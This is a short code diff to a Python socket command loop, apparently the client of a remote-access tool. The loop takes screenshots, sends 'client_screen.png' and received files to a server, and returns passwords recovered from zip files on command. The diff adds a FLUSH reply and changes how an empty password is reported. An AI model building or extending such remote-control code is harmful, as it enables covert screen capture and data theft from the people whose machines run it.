@@ -19,6 +19,8 @@ def runShell(socketHolder):
 	if data:
 		if data == "SENDFILE":
 			incomingFile(socketHolder)
+		elif data == "FLUSH":
+			socketHolder.send("FLUSH")
 		elif data == "RECOVERFILE":
 			fileName = "client_screen.png"
 			sendToServer(fileName, socketHolder)
@@ -26,7 +28,11 @@ def runShell(socketHolder):
 			screenShot()
 		elif data == "OPENZIP":
 			password = openZip()
-			if str(password):
+			if not password:
+				password = None
+				password = "No password"
+				socketHolder.send(password)
+			else:
 				socketHolder.send(password)
 		elif data == "EXIT":
 			socketHolder.send('EXIT')
